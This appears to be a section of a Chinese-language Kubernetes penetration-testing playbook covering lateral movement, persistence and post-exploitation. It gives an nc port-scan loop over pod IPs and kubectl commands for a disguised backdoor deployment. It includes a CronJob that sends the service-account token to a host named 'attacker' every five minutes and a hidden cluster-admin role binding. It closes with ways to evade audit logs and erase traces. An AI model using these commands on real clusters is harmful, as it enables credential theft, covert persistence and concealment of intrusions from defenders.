## 八、K8s 横向移动、持久化与后渗透

### 8.1 横向移动技术

```
1. ServiceAccount Token 横向：窃取高权 SA → 访问其他 namespace 资源
2. 恶意 Pod/CronJob 横向：在目标 namespace 落地后门（伪装成业务镜像）
3. NetworkPolicy 缺失 → 任意 Pod 间互通 → 扫描内网服务（数据库/管理端）
4. NodePort/LoadBalancer 暴露内部服务（或攻击者自行暴露）
5. Secret/ConfigMap 收割：业务配置中的数据库密码/API Key（大量真实案例）
6. Admission Webhook 劫持：有 webhook 配置权限时插入恶意 validating/mutating webhook
7. DNS 枚举：*.svc.cluster.local 服务发现 + SRV 记录探测
8. 节点间横向：node 逃逸后 kubelet 证书 → 其他节点 kubelet（10250 可达时）
```

```bash
# 集群内服务发现
nslookup -type=SRV _http._tcp.default.svc.cluster.local
# 扫描常见高价值服务端口（数据库/缓存/管理面板）
for ip in $(kubectl get pods -A -o wide | awk '{print $6}' | grep -E '^10\.'); do
  nc -zvw1 $ip 3306 6379 9200 2>&1 | grep open
done

# 集群内反弹/代理
# 用 kubelet 或特权 Pod 建立 SOCKS 代理进入集群内部网络
```

### 8.2 持久化技术

```bash
# 1. 恶意 Deployment/StatefulSet（伪装业务名）
kubectl create deployment nginx-proxy --image=malicious:latest

# 2. CronJob 定时任务（挖矿/信息收集）
kubectl apply -f - <<EOF
apiVersion: batch/v1
kind: CronJob
metadata:
  name: metric-collector
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: c
            image: alpine
            command: ["/bin/sh","-c","wget -qO- http://attacker:8080/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) >/dev/null"]
          restartPolicy: Never
EOF

# 3. 高权 SA 绑定（授权级持久化，删 Pod 无效）
kubectl create clusterrolebinding hidden-admin --clusterrole=cluster-admin \
  --serviceaccount=<ns>:<backdoor-sa>

# 4. 节点级：宿主 crontab/systemd（逃逸后）
# 5. 镜像投毒式：污染 CI 使用的上游镜像（供应链级持久化，最隐蔽）
```

### 8.3 后渗透与痕迹清理

```
- 审计日志规避：kubelet 直连 /exec 不产生 API 审计命令记录；利用 WebSocket 通道
- 事件清理：删除恶意 Pod 的 events；修改 Deployment 的 ownerReferences
- 日志规避：镜像内不落盘、stdout 少输出、回连用加密通道（WireGuard/SSH 隧道）
- 备用通道：同时保留 RBAC 授权 + Pod 后门 + 镜像投毒 三层持久化
```

